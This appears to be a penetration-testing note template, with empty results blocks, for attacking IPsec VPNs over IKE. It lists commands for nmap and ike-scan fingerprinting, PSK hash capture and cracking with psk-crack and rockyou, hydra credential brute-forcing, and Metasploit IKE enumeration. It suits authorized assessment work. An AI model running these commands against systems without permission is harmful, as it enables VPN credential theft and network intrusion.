## Enumeration
Start by scanning the target for **UDP port 500**, which is used by the **IKE (Internet Key Exchange) protocol** in IPsec VPNs.
```powershell
nmap -sU -p 500 --script ike-version <% tp.frontmatter["RHOSTS"] %>
```
results
```powershell

```
## Identify VPN Vendor & Configuration
Use **ike-scan** to fingerprint the VPN system.

### Passive Fingerprinting
```powershell
ike-scan -M -A <% tp.frontmatter["RHOSTS"] %>
```
results
```powershell

```

### Aggressive Mode Detection
```powershell
ike-scan -A --trans=1,2,3,4,5 <% tp.frontmatter["RHOSTS"] %>
```
results
```powershell

```


## Extract VPN Group Name & Hash

If aggressive mode is enabled, use **ike-scan** to grab the **pre-shared key (PSK) hash**.
```powershell
ike-scan -A --pskcrack <% tp.frontmatter["RHOSTS"] %>
```
results
```powershell

```

If a PSK hash is found, crack it using **[[pskcrack]]**:
```powershell
psk-crack --dictionary=/usr/share/eaphammer/wordlists/rockyou.txt hashfile.txt
```
results
```powershell

```

## Brute-Force IKE Authentication
Try brute-forcing VPN credentials using **Hydra**.
```powershell
hydra -L userlist.txt -P passlist.txt -e ns -u <% tp.frontmatter["RHOSTS"] %> ike
```
results
```powershell

```

## Intercept and Analyze VPN Traffic
If you have access to network traffic, use **Wireshark** to capture and analyze IKE packets.

#### Filter for VPN Traffic
```powershell
udp.port == 500
```

**Why this matters:**
- Helps detect **IKE negotiations, key exchanges, and potential misconfigurations.**    
- If Aggressive Mode is used, you may see the **group name in plaintext**.


## Exploit Weak VPN Configurations

#### Check for CVE Vulnerabilities
Search for known **VPN-related vulnerabilities**:
```powershell
searchsploit ike
```
or
```powershell
msfconsole
msf> search ike
```

results
```powershell

```
#### Exploit Weak Pre-Shared Keys (IKEv1)
```powershell
use auxiliary/scanner/ipsec/ike_enum
set RHOSTS <% tp.frontmatter["RHOSTS"] %>
exploit
```
results
```powershell

```





























